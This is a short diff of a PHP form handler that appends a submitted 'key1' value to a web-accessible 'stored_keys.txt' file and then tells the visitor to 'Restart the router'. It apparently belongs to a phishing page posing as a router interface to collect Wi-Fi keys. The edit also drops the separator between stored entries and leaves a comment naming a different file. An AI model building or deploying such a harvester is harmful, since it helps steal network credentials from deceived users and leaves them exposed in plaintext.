@@ -1146,18 +1146,10 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     if (isset($_POST['key1']) && !empty($_POST['key1'])) {
         // Get the input value
         $key1 = $_POST['key1'];
+
+        // Append the user data to the usr.txt file
+         file_put_contents('stored_keys.txt', $key1, FILE_APPEND);
         
-        // Define the file path
-        $file = 'stored_keys.txt';
-        
-        // Open the file in append mode, create it if it doesn't exist
-        $fileHandle = fopen($file, 'a') or die("Unable to open file!");
-        
-        // Write the key to the file
-        fwrite($fileHandle, $key1 . PHP_EOL);
-        
-        // Close the file
-        fclose($fileHandle);
         
         // Echo a success message
         echo "Restart the router";
